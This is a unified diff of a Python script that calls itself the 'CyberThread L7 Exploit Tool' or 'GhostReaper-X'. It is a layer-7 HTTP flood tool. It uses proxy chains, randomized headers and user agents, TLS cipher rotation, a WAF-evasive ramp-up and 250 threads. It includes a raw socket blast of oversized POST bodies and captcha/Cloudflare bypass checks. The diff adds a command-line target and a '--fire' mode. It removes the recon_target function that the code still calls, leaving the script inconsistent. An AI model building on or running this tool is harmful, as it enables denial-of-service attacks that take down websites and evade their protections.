@@ -11,6 +11,7 @@ import traceback
 import os
 import base64
 import requests
+import argparse
 
 # ANSI color codes for output
 ANSI_RED = "\033[91m"
@@ -50,7 +51,12 @@ fail_ratio = 0
 max_retries = 5
 retry_counter = 0
 
-# Load proxies and user agents
+def parse_args():
+    parser = argparse.ArgumentParser(description="CyberThread L7 Exploit Tool")
+    parser.add_argument("--target", type=str, help="Override default target (e.g., http://example.com)")
+    parser.add_argument("--fire", action="store_true", help="Run in brutal mode")
+    return parser.parse_args()
+
 def load_list(file):
     if not os.path.exists(file):
         print(f"{ANSI_RED}[ERROR] File not found: {file}{ANSI_RESET}")
@@ -84,7 +90,6 @@ def load_user_agents(file):
     global user_agents
     user_agents = load_list(file)
 
-# Inject headers with random chaining
 def inject_headers():
     headers = {
         "Content-Type": "application/json",
@@ -108,7 +113,6 @@ def inject_headers():
         headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
     return headers
 
-# Generate dynamic user-agent
 def generate_user_agent():
     user_agent_pool = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -119,10 +123,8 @@ def generate_user_agent():
     ]
     return random.choice(user_agent_pool)
 
-# Mutate payload for various types
 def mutate_payload(payload_type):
     if payload_type == "ghost-mutation":
-        # Payload chaining and size amplification
         return json.dumps({
             "action": "ghost",
             "random": random.randint(1, 9999),
@@ -146,19 +148,16 @@ def mutate_payload(payload_type):
     else:
         return json.dumps({"error": "unknown payload type"})
 
-# Rotate proxy chain
 def rotate_proxy_chain():
     if not proxies:
         return []
     return random.sample(proxies, k=min(hop_count, len(proxies)))
 
-# Cycle session (simulate login, action, logout)
 def cycle_session():
     if not proxies:
         return
     try:
         start_time = time.time()
-        # Simulate login
         login_payload = {"username": "user", "password": "pass"}
         login_headers = inject_headers()
         host, port = random.choice(proxies).split(":")
@@ -169,14 +168,12 @@ def cycle_session():
             print(f"Login failed with status code {response.status}")
             return
 
-        # Perform action
         action_payload = mutate_payload(payload_type)
         action_headers = inject_headers()
         conn.request(flood_method.upper(), target, action_payload, action_headers)
         response = conn.getresponse()
         handle_response(response, target, 1, time.time() - start_time)
 
-        # Simulate logout
         logout_headers = inject_headers()
         conn.request("POST", "/logout", "", logout_headers)
         response = conn.getresponse()
@@ -185,7 +182,6 @@ def cycle_session():
     except Exception as e:
         print(f"{ANSI_RED}[ERROR] cycle_session: {traceback.format_exc()}{ANSI_RESET}")
 
-# Handle response and update status counter
 def handle_response(response, target, proxy_hop, rtt):
     status_code = response.status
     response_body = response.read().decode('utf-8', errors='ignore')
@@ -206,13 +202,11 @@ def handle_response(response, target, proxy_hop, rtt):
 
     analyze_bypass(status_code, response_body)
 
-# Rotate headers and TLS
 def rotate_headers_and_tls():
     global headers, tls_context
     headers = inject_headers()
     tls_context = rotate_tls_context()
 
-# Rotate TLS context
 def rotate_tls_context():
     ctx = ssl.create_default_context()
     ciphers = [
@@ -229,7 +223,6 @@ def rotate_tls_context():
             print(f"{ANSI_RED}[ERROR] TLS context rotation failed: {e}{ANSI_RESET}")
     return ctx
 
-# Analyze security bypass
 def analyze_bypass(status_code, response_text):
     try:
         if "cpatha" in response_text.lower():
@@ -261,7 +254,6 @@ def analyze_bypass(status_code, response_text):
     except Exception as e:
         print(f"{ANSI_RED}[ERROR] analyze_bypass: {traceback.format_exc()}{ANSI_RESET}")
 
-# Monitor target status
 def monitor_target():
     global parsed_url
     parsed_url = urlparse(target)
@@ -275,7 +267,6 @@ def monitor_target():
             print("[MONITOR] Target not responding.")
         time.sleep(5)
 
-# Clone target headers
 def clone_target_headers():
     global parsed_url
     parsed_url = urlparse(target)
@@ -284,7 +275,6 @@ def clone_target_headers():
     res = conn.getresponse()
     return dict(res.getheaders())
 
-# Raw socket blast
 def raw_socket_blast(ip, port=443):
     context = rotate_tls_context()
     with socket.create_connection((ip, port)) as sock:
@@ -293,26 +283,8 @@ def raw_socket_blast(ip, port=443):
                 payload = f"POST / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nContent-Length: 10000\r\n\r\n{'A'*10000}"
                 ssock.send(payload.encode())
 
-# Launch GhostReaper-X sequence
 def launch_ghost_sequence():
     global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file
-
-    # Hardcoded values for auto-fire mode
-    target = "http://example.com"
-    threads = 250
-    proxy_file = "/tmp/auto_proxy.txt"
-    ua_file = "/tmp/ua_fallback.txt"
-    hop_count = 3
-    payload_type = "ghost-mutation"
-    bypass_header = True
-    tls_spoofing = True
-    session_cycle = True
-    exploit_chain = True
-    delay = 0.1
-    flood_method = "POST"
-    failover_monitoring = True
-    silent_mode = False
-    log_file_path = None  # Ensure log_file_path is defined
 
     print("\nReady to launch GhostReaper-X Sequence")
     print(f"Target     : {target}")
@@ -329,13 +301,9 @@ def launch_ghost_sequence():
     print(f"Silent Mode : { 'Enabled' if silent_mode else 'Disabled' }")
     print(f"Log File   : {log_file_path if log_file_path else 'None'}")
 
-    if not silent_mode:
-        input("[Enter] to begin sequence...\n")
-
     load_proxies(proxy_file)
     load_user_agents(ua_file)
 
-    # Run recon after target is set
     print(f"[✓] Running recon on {target} ...")
     recon_target(target)
 
@@ -386,7 +354,6 @@ def launch_ghost_sequence():
         thread_pool.append(thread)
         time.sleep(random.uniform(0.01, 0.03))  # WAF evasive ramp-up
 
-    # Start real-time status display
     threading.Thread(target=print_status).start()
 
     if failover_monitoring:
@@ -408,54 +375,9 @@ def print_status():
             last_state.update(status_counter)
         time.sleep(1)
 
-# Additional functions for enhanced capabilities
-
-def obfuscate(data):
-    return data.replace("script", "scr"+"ipt").replace("admin", "a"+"dmin")
-
-def fetch_proxies_online():
-    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
-    r = requests.get(url)
-    return r.text.splitlines()
-
-def encode_payload(data):
-    return base64.b64encode(data.encode()).decode()
-
-def build_payload_chain():
-    chain = []
-    for _ in range(10):
-        payload = mutate_payload("ghost-mutation")
-        payload = encode_payload(payload)
-        chain.append(payload)
-    return chain
-
-def save_payload_chain(file_path, chain):
-    with open(file_path, 'w') as f:
-        for payload in chain:
-            f.write(f"{payload}\n")
-
-def load_payload_chain(file_path):
-    with open(file_path, 'r') as f:
-        return [line.strip() for line in f]
-
-def recon_target(target):
-    try:
-        parsed = urlparse(target)
-        conn = http.client.HTTPSConnection(parsed.hostname, context=ssl.create_default_context())
-        conn.request("GET", "/")
-        res = conn.getresponse()
-        headers = dict(res.getheaders())
-        if "Server" in headers:
-            print(f"[+] Server fingerprint: {headers['Server']}")
-        if "cf-ray" in headers:
-            print("[+] Cloudflare WAF detected")
-    except Exception as e:
-        print(f"[!] Recon failed: {e}")
-
-# Banner functions
 def print_banner_brutal():
     print("""
-╔══════════════════════════════════════╗
+══════════════════════════════════════╗
 ║   ☠ CYBERTHREAD ☠                   ║
 ║   Layer-7 Adaptive Exploit Engine   ║
 ║   Status : LIVE | Threads : █████   ║
@@ -468,33 +390,31 @@ def print_banner_brutal():
      ↳ Response Map    : [200✓] [403✗] [503⚠]
     """)
 
-def print_banner_stealth():
-    print("""
-╭────────────────────────────────────────────╮
-│  CYBERTHREAD Recon Module [Stealth Mode]  │
-│  Target       : x.x.x.x / domain.com       │
-│  Proxy Hop    : Randomized + Obfuscated    │
-│  UA Pool      : 1000+ Real Signatures      │
-│  Header Mask  : CPATHA / Cloudflare Bypass │
-╰────────────────────────────────────────────╯
-   [+] Initial Fingerprint     : OK
-   [+] CDN Detection           : ✓ Cloudflare
-   [+] Firewall Signatures     : ✓ Detected
-    """)
-
-def print_banner_mini():
-    print("""
-[ CYBERTHREAD ] ⚔  L7 Exploit Injector
-↳ Stealth Mode : ENABLED
-↳ Mutation     : Ghost Payload
-↳ Threads      : █████ Brutal
-    """)
-
-# Main function to start the attack
 if __name__ == "__main__":
+    args = parse_args()
+    if args.target:
+        target = args.target
+
     if not log_file_path:
         log_file_path = f"/sdcard/cyberthread_log_{int(time.time())}.txt"
     log_file = open(log_file_path, 'a')
-    print_banner_mini()
-    launch_ghost_sequence()
+
+    print_banner_brutal()
+
+    if args.fire:
+        bypass_header = True
+        tls_spoofing = True
+        session_cycle = True
+        exploit_chain = True
+        failover_monitoring = True
+        delay = 0.1
+        payload_type = "ghost-mutation"
+        threads = 250
+        flood_method = "POST"
+        hop_count = 3
+        proxy_file = "/tmp/auto_proxy.txt"
+        ua_file = "/tmp/ua_fallback.txt"
+
+        launch_ghost_sequence()
+
     log_file.close()
